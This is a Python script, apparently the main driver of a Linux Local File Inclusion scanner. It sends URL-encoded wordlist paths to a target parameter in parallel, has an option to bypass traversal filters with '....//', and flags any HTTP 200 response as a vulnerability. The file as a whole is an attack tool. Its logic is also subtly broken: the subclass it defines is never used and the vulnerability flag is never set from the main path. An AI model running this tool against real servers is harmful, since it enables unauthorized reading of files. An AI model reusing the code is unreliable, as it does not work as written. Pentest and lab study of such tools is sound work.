from utils.validators import validate_positive_integer, validate_url
from banner.banner import banner, RED, GREEN, YELLOW, BLUE, CYAN, END
from attacks.linux import LinuxLFI
import argparse
import asyncio
import time
import pathlib
import urllib.parse
from tqdm import tqdm

vulnerabilities_found = False


def parse_arguments():
    parser = argparse.ArgumentParser(description="Linux Local File Inclusion (LFI) Scanner")
    parser.add_argument("-t", "--target", required=True, type=validate_url,
                        help="Target URL (e.g., http://94.237.61.133:39139/index.php?language=)")
    parser.add_argument("-wc", "--walkcount", required=True, type=validate_positive_integer,
                        help="Number of directories to walk up")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to your wordlist")
    parser.add_argument("-th", "--threads", type=int, default=5, choices=range(1, 101), metavar="[1-100]",
                        help="Number of threads for parallel requests (default: 5)")
    parser.add_argument("-nrf", "--nonrecursivefilter", action="store_true",
                        help="Bypass non-recursive path filters by appending ....// instead of ../")
    parser.add_argument("-to", "--timeout", type=float, default=10.0,
                        help="Request timeout in seconds (default: 10)")
    parser.add_argument("-v", "--verbose", action='store_true', help="Enable verbose output")
    parser.add_argument("-FS", "--fullscan", action="store_true", help="Enable full scan mode")
    return parser.parse_args()


async def main():
    global vulnerabilities_found
    args = parse_arguments()
    
    banner()
    
    if args.verbose:
        print(f"{GREEN}[+]{END} Target URL: {CYAN}{args.target}{END}")
        print(f"{GREEN}[+]{END} Walk count: {CYAN}{args.walkcount}{END}")
        print(f"{GREEN}[+]{END} Threads: {CYAN}{args.threads}{END}")
        print(f"{GREEN}[+]{END} Timeout: {CYAN}{args.timeout}s{END}")
    
    if args.fullscan:
        print(f"{YELLOW}[WARNING]{END} Full scan enabled. This may take longer.")
    
   
    wordlist_path = pathlib.Path(args.wordlist)
    if not wordlist_path.exists():
        print(f"{RED}[ERROR]{END} Wordlist not found: {args.wordlist}")
        exit(1)
    if not wordlist_path.is_file():
        print(f"{RED}[ERROR]{END} Path is not a file: {args.wordlist}")
        exit(1)
    
    try:
        with open(args.wordlist, "r") as f:
            file_paths = tqdm(f, desc="Processing wordlist", unit="path", dynamic_ncols=True)
            
            
            payloads = [urllib.parse.quote_plus(line.strip()) for line in file_paths]
            
            await LinuxLFI.execute_attack_parallel(payloads, args)

            if vulnerabilities_found:
                print(f"{GREEN}[+]{END} Vulnerabilities found during scan.")
            else:
                print(f"{YELLOW}[INFO]{END} No vulnerabilities found during scan.")
                
    except Exception as e:
        print(f"{RED}[ERROR]{END} An error occurred: {str(e)}")
        exit(1)

def report_vulnerability(url):
    global vulnerabilities_found
    vulnerabilities_found = True
    print(f"{RED}[VULNERABILITY FOUND]{END} Possible LFI vulnerability at: {url}")


class CustomLinuxLFI(LinuxLFI):
    async def execute_attack_parallel(self, payloads, args):
        global vulnerabilities_found
        for payload in payloads:
            target_url = f"{args.target}{payload}"

            try:
                # Changed from LinuxLFI.perform_request to super() call
                response = await super().perform_request(target_url, args)

                if response.status == 200:
                    report_vulnerability(target_url)

            except Exception as e:
                print(f"{RED}[ERROR]{END} Error with URL: {target_url} - {str(e)}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[WARNING]{END} Scan interrupted by user")
        exit(0)
